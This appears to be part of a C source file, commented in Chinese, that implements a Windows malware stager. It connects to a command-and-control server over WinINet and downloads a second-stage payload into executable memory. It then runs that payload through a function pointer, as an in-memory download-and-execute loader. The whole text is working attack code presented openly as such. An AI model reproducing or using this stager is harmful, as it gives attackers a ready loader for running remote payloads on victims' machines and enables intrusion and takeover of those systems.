// 模拟 shellcode 失败路径（简单退出）
void failure_exit() {
    ExitProcess(1);
}

// 主函数：执行 HTTP 下载并执行第二阶段 payload
void ExecuteStager() {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    LPVOID stageBuffer = NULL;
    DWORD bytesRead = 0;
    BOOL result;
    int retryCount = 0;

    // 1. 打开 Internet 会话（Agent = NULL 等效于默认）
    hInternet = InternetOpenA(
        NULL,               // lpszAgent
        0,                  // dwAccessType (INTERNET_OPEN_TYPE_PRECONFIG)
        NULL,               // lpszProxyName
        NULL,               // lpszProxyBypass
        0                   // dwFlags
    );
    if (!hInternet) {
        failure_exit();
    }

    // 2. 连接到 C2 服务器
    hConnect = InternetConnectA(
        hInternet,
        C2_HOST,
        C2_PORT,
        NULL,               // lpszUserName
        NULL,               // lpszPassword
        INTERNET_SERVICE_HTTP,
        0,                  // dwFlags
        0                   // dwContext
    );
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        failure_exit();
    }

    // 3. 构造 HTTP GET 请求
    hRequest = HttpOpenRequestA(
        hConnect,
        NULL,               // lpszVerb (默认 GET)
        REQUEST_URI,
        NULL,               // lpszVersion (默认 HTTP/1.1)
        NULL,               // lpszReferrer
        NULL,               // lplpszAcceptTypes
        HTTP_OPEN_FLAGS,
        0                   // dwContext
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        failure_exit();
    }

    // 4. 发送请求（带 User-Agent 头，最多重试 10 次）
    while (retryCount < MAX_RETRIES) {
        result = HttpSendRequestA(
            hRequest,
            USER_AGENT,
            -1,             // dwHeadersLength = -1 表示以 NULL 结尾
            NULL,           // lpOptional
            0               // dwOptionalLength
        );
        if (result) {
            break;          // 成功
        }
        retryCount++;
    }
    if (!result) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        failure_exit();
    }

    // 5. 分配内存用于接收第二阶段 payload
    stageBuffer = VirtualAlloc(
        NULL,
        STAGE_SIZE,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (!stageBuffer) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        failure_exit();
    }

    // 6. 循环读取响应数据到缓冲区
    LPBYTE currentPos = (LPBYTE)stageBuffer;
    while (TRUE) {
        BOOL readOk = InternetReadFile(
            hRequest,
            currentPos,
            BUFFER_SIZE,
            &bytesRead
        );
        if (!readOk) {
            // shellcode 中的失败处理（略微偏移到 failure 逻辑）
            failure_exit();
        }
        if (bytesRead == 0) {
            break;          // 读取完毕
        }
        currentPos += bytesRead;
    }

    // 7. 关闭句柄
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // 8. shellcode 将 stage 起始地址压栈并通过 ret 执行
    //    此处我们直接将控制权交给 stage（通过函数指针强制转换）
    void (*stage_entry)() = (void (*)())stageBuffer;
    stage_entry();

    // 注意：如果 stage 执行后返回，我们不会到达这里
    // 为防止未定义行为，可以添加 ExitProcess
    ExitProcess(0);
}

// 程序入口
int main() {
    ExecuteStager();
    return 0;
}
```